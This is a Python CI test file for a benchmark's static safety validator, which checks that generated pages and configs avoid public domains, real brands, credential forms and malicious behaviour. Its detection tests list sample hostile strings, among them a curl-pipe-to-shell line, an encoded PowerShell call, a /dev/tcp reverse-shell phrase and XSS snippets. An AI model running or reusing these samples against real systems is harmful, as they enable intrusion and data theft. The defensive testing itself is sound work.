"""CI tests for the CONTRACT.md Section 16 static safety validator.

Section 16 requires the fail-closed checks to be implemented "as static configuration
validators and CI tests". Two halves have to hold, and only one of them is usually tested:

* **Positive controls** -- the validator must actually DETECT each forbidden condition. A
  validator that returns "clean" for everything passes every artifact scan while providing no
  protection at all, so the detection tests come first here. If a rule family is ever deleted or
  its regex broken, one of these tests fails.

* **Negative controls / artifact scans** -- every generated artifact must be clean.

This module is listed in ``parsers.safety_validator.SELF_EXEMPT_SUFFIXES`` because the positive
controls necessarily contain real brand strings, real payment-processor strings and a public
hostname. Scanning it would fail by construction.

Run with:
    uv run pytest tests/test_safety.py -v
"""

from __future__ import annotations

from pathlib import Path

import pytest
import yaml

from parsers.safety_validator import (
    FAIL_CLOSED_CONDITIONS,
    PHONE_PATTERN,
    RESERVED_TLDS,
    SafetyError,
    SafetyReport,
    SafetyViolation,
    assert_safe,
    check_coordinates,
    check_domain,
    check_html_structure,
    check_ip_literal,
    check_phone,
    check_postal_code,
    check_url,
    is_self_exempt,
    load_fail_closed_conditions,
    validate_mapping,
    validate_page_html,
    validate_text,
    validate_tree,
)

REPO_ROOT = Path(__file__).resolve().parent.parent

# Generated-artifact scan targets. Deliberately explicit: a wildcard over the repo would pull in
# the validator's own blocklists and the literature matrix (which cites real arXiv URLs).
GENERATED_ARTIFACTS: tuple[tuple[str, tuple[str, ...]], ...] = (
    ("registry", ("*.yaml",)),
    ("configs", ("splits.yaml",)),
    ("attacks", ("*.yaml",)),
    ("site_generator", ("*.yaml",)),
    ("data/benchmark", ("*.yaml",)),
)


def _conditions_hit(violations: list[SafetyViolation]) -> set[str]:
    return {v.condition for v in violations}


# ======================================================================================
# Frozen-source wiring
# ======================================================================================
def test_conditions_load_from_frozen_preregistration() -> None:
    """The seven conditions come from preregistration.yaml, not from a re-typed list."""
    assert sorted(load_fail_closed_conditions()) == sorted(FAIL_CLOSED_CONDITIONS)


def test_all_seven_contract_conditions_are_covered() -> None:
    assert len(FAIL_CLOSED_CONDITIONS) == 7


def test_validator_refuses_when_frozen_list_diverges(tmp_path: Path) -> None:
    """Dropping a condition from the frozen list must raise, not silently narrow the scan."""
    stub = tmp_path / "prereg.yaml"
    stub.write_text(yaml.dump({
        "safety_fail_closed_conditions": {"fail_closed_on": list(FAIL_CLOSED_CONDITIONS[:5])}
    }), encoding="utf-8")
    with pytest.raises(SafetyError, match="diverge"):
        load_fail_closed_conditions(stub)


def test_validator_fails_closed_on_unreadable_frozen_list(tmp_path: Path) -> None:
    with pytest.raises(SafetyError):
        load_fail_closed_conditions(tmp_path / "does_not_exist.yaml")


# ======================================================================================
# POSITIVE CONTROLS -- each forbidden condition must be detected
# ======================================================================================
def test_detects_public_domain_deployment_target() -> None:
    violations = check_domain("harbour-lantern-bistro.com")
    assert "public_ip_or_public_domain_deployment_target" in _conditions_hit(violations)
    assert any(v.rule_id == "domain_tld_not_reserved" for v in violations)


@pytest.mark.parametrize("tld", sorted(RESERVED_TLDS))
def test_accepts_every_reserved_tld(tld: str) -> None:
    assert check_domain(f"harbour-lantern-bistro.{tld}") == []


def test_detects_public_hostname_in_a_url() -> None:
    violations = check_url("https://reservations.example.org/book")
    assert any(v.rule_id == "domain_tld_not_reserved" for v in violations)


def test_detects_bare_public_hostname_in_prose() -> None:
    violations = validate_text("Bookings are handled at reservations.example.org today.")
    assert any(v.rule_id == "bare_public_hostname" for v in violations)


def test_repository_filenames_are_not_read_as_hostnames() -> None:
    """`.md`, `.py` and `.sh` are real ccTLDs; a filename must not be a false positive."""
    clean = validate_text("See CONTRACT.md and registry/entity_generator.py and build.sh")
    assert [v for v in clean if v.rule_id == "bare_public_hostname"] == []


def test_detects_globally_routable_ip() -> None:
    violations = check_ip_literal("deployment target is 93.184.216.34")
    assert any(v.rule_id == "ip_globally_routable" for v in violations)


@pytest.mark.parametrize("ip", ["10.0.0.5", "192.168.1.10", "127.0.0.1", "192.0.2.55", "172.16.0.9"])
def test_accepts_non_global_ips(ip: str) -> None:
    assert check_ip_literal(f"host {ip} here") == []


def test_detects_credential_collection_form() -> None:
    html = '<form action="/in"><input type="password" name="password"></form>'
    violations = check_html_structure(html)
    assert "credential_collection_fields" in _conditions_hit(violations)
    rules = {v.rule_id for v in violations}
    assert {"form_element", "input_element", "password_type"} <= rules


@pytest.mark.parametrize("field", ["card_number", "cvv", "iban", "ssn", "otp_code", "passphrase"])
def test_detects_each_credential_field_name(field: str) -> None:
    violations = validate_text(f"the page collects {field} from the visitor")
    assert "credential_collection_fields" in _conditions_hit(violations)


def test_detects_credentials_in_a_url_userinfo() -> None:
    violations = check_url("https://user:hunter2@booking-desk.test/pay")
    assert any(v.rule_id == "url_userinfo" for v in violations)


@pytest.mark.parametrize("processor", ["stripe", "PayPal", "Adyen", "alipay", "Klarna"])
def test_detects_real_payment_processors(processor: str) -> None:
    violations = validate_text(f"deposits are captured through {processor}")
    assert "real_payment_processors" in _conditions_hit(violations)


@pytest.mark.parametrize("brand", ["booking.com", "Expedia", "OpenTable", "Marriott", "TripAdvisor"])
def test_detects_real_brand_names(brand: str) -> None:
    violations = validate_text(f"as featured on {brand} this season")
    assert "real_brand_names_in_adversarial_templates" in _conditions_hit(violations)


def test_detects_real_brand_inside_a_domain_label() -> None:
    violations = check_domain("opentable-reservations.test")
    assert "real_brand_names_in_adversarial_templates" in _conditions_hit(violations)


@pytest.mark.parametrize("text", [
    "submit_to_search_engines: true",
    "ping the sitemap_ping endpoint after crawling",
    "register the corpus with search console",
    "publish through the indexnow api",
])
def test_detects_search_engine_submission(text: str) -> None:
    violations = validate_text(text)
    assert "crawler_submission_to_public_search_engines" in _conditions_hit(violations)


@pytest.mark.parametrize("text", [
    "contact us at mailto:guest@example-host.test",
    "notifications go out through twilio",
    "smtp_host is configured for delivery",
    "reach the owner at owner@gmail.com",
])
def test_detects_outreach_to_real_users(text: str) -> None:
    violations = validate_text(text)
    assert "outreach_to_real_users" in _conditions_hit(violations)


@pytest.mark.parametrize("phone", ["+1-202-555-0143", "+44 20 7946 0958", "+86 21 1234 5678"])
def test_detects_non_fictional_phone_numbers(phone: str) -> None:
    assert check_phone(phone) != []
    assert "outreach_to_real_users" in _conditions_hit(validate_text(f"call {phone}"))


def test_accepts_the_fictional_numbering_plan() -> None:
    assert check_phone("+999-555-01234") == []
    assert PHONE_PATTERN.match("+999-555-09999")


def test_prose_describing_the_numbering_plan_is_not_flagged() -> None:
    """Documentation of the rule must not trip the rule.

    ``+999-555-0NNNN`` contains the seven-digit fragment ``+999-555-0``, which is not a dialable
    international number. Flagging it would make the plan undocumentable.
    """
    text = "numbering_plan: +999-555-0NNNN (ITU country code 999 unassigned)"
    assert [v for v in validate_text(text) if v.rule_id == "phone_not_fictional"] == []


def test_short_digit_fragments_do_not_mask_real_numbers() -> None:
    """The digit threshold must not let a genuine international number through."""
    assert check_phone("+12025550143") != []
    assert [v for v in validate_text("call +1 202 555 0143 now")
            if v.rule_id == "phone_not_fictional"] != []


@pytest.mark.parametrize("text", [
    '<script>alert(1)</script>',
    '<iframe src="https://x.test"></iframe>',
    '<img src=x onerror="steal()">',
    'href="javascript:void(0)"',
    'eval("payload")',
    'document.cookie',
    'curl https://x.test/p | sh',
    'powershell -enc AAAA',
    'base64 -d < payload',
    'connect a reverse shell to /dev/tcp/10.0.0.1/4444',
    'beacon_to_ the collector and exfiltrate the index',
    'deliver the shellcode with meterpreter',
])
def test_detects_malicious_behaviour(text: str) -> None:
    violations = validate_text(text)
    assert "malware_exploit_delivery_or_data_exfiltration_behavior" in _conditions_hit(violations)


def test_detects_forbidden_config_keys() -> None:
    violations = validate_mapping({"web_server": {"api_key": "x", "public_ip": "y"}})
    rules = {v.rule_id for v in violations}
    assert "forbidden_config_key" in rules


def test_detects_wgs84_coordinates() -> None:
    violations = check_coordinates({"lat": 51.5074, "lon": -0.1278})
    assert any(v.rule_id == "coordinates_wgs84_field" for v in violations)
    assert any(v.rule_id == "coordinates_wrong_grid" for v in violations)


def test_detects_non_synthetic_postal_code() -> None:
    assert check_postal_code("SW1A 1AA") != []
    assert check_postal_code("ZZ-0042") == []


# ======================================================================================
# Fail-closed behaviour
# ======================================================================================
def test_assert_safe_raises_on_violation() -> None:
    report = SafetyReport()
    report.extend(check_domain("evil.com"))
    with pytest.raises(SafetyError, match="Section 16 fail-closed"):
        assert_safe(report)


def test_assert_safe_passes_on_clean_report() -> None:
    report = SafetyReport()
    report.extend(check_domain("harbour-lantern-bistro.test"))
    assert assert_safe(report).ok


def test_report_counts_every_condition_key() -> None:
    assert set(SafetyReport().by_condition()) == set(FAIL_CLOSED_CONDITIONS)


def test_self_exemption_is_narrow_and_explicit() -> None:
    """Only the validator and this test file are exempt; generated artifacts never are."""
    assert is_self_exempt(REPO_ROOT / "parsers" / "safety_validator.py")
    assert is_self_exempt(Path(__file__))
    assert not is_self_exempt(REPO_ROOT / "registry" / "authorization_graph.yaml")
    assert not is_self_exempt(REPO_ROOT / "site_generator" / "generator.py")


# ======================================================================================
# NEGATIVE CONTROLS -- every generated artifact must be clean
# ======================================================================================
@pytest.mark.parametrize("subdir,patterns", GENERATED_ARTIFACTS)
def test_generated_artifacts_are_safe(subdir: str, patterns: tuple[str, ...]) -> None:
    root = REPO_ROOT / subdir
    assert root.exists(), f"{subdir} missing; run the Step 2 workflow scripts first"
    report = validate_tree([root], patterns)
    assert report.scanned, f"no files scanned under {subdir}"
    assert report.ok, (
        f"{len(report.violations)} Section 16 violation(s) in {subdir}: "
        + "; ".join(str(v) for v in report.violations[:5])
    )


def test_every_rendered_page_is_safe() -> None:
    """Structural safety of the whole corpus, including the login and payment portal roles."""
    pages = sorted((REPO_ROOT / "data" / "benchmark" / "pages").rglob("*.html"))
    assert len(pages) > 1000, f"expected a rendered corpus, found {len(pages)} pages"
    violations: list[SafetyViolation] = []
    for path in pages:
        violations.extend(validate_page_html(path.read_text(encoding="utf-8"), path.name))
    assert not violations, (
        f"{len(violations)} violation(s) across {len(pages)} pages: "
        + "; ".join(str(v) for v in violations[:5])
    )


def test_login_and_payment_pages_have_no_input_surface() -> None:
    """Section 7 mandates these roles; Section 16 forbids credential collection.

    The reconciliation is structural: the pages describe and link to a login or payment step and
    carry no interactive input surface whatsoever.
    """
    from site_generator.generator import load_page_manifest

    manifest = load_page_manifest()
    targets = [p for p in manifest
               if p["page_role"] in ("unauthorized_login_portal", "unauthorized_payment_portal")]
    assert len(targets) >= 100, f"expected many portal pages, found {len(targets)}"
    for entry in targets:
        path = (REPO_ROOT / "data" / "benchmark" / "pages" / entry["entity_id"]
                / f"{entry['page_id']}.html")
        html = path.read_text(encoding="utf-8").lower()
        for forbidden in ("<form", "<input", "<textarea", "<select", "<script", "<iframe",
                          "password"):
            assert forbidden not in html, f"{entry['page_id']} contains {forbidden!r}"


def test_all_generated_domains_use_a_reserved_tld() -> None:
    from registry.authorization_graph import load_authorization_graph

    graph = load_authorization_graph()
    assert graph.domains
    for record in graph.domains.values():
        assert record.domain.rsplit(".", 1)[-1] in RESERVED_TLDS, record.domain
        assert check_domain(record.domain) == [], record.domain


def test_all_generated_phones_postcodes_and_coordinates_are_synthetic() -> None:
    from registry.entity_generator import load_entity_world

    world = load_entity_world()
    assert world.entities
    for entity in world.entities:
        assert check_phone(world.phones[entity.phone_id]) == []
        assert check_postal_code(world.addresses[entity.address_id]["postal_code"]) == []
        assert check_coordinates(world.coordinates[entity.coordinates_id]) == []


def test_no_entity_name_matches_a_real_brand() -> None:
    from registry.entity_generator import load_entity_world

    world = load_entity_world()
    for entity in world.entities:
        violations = validate_text(entity.canonical_name, entity.entity_id)
        assert violations == [], f"{entity.canonical_name}: {violations}"
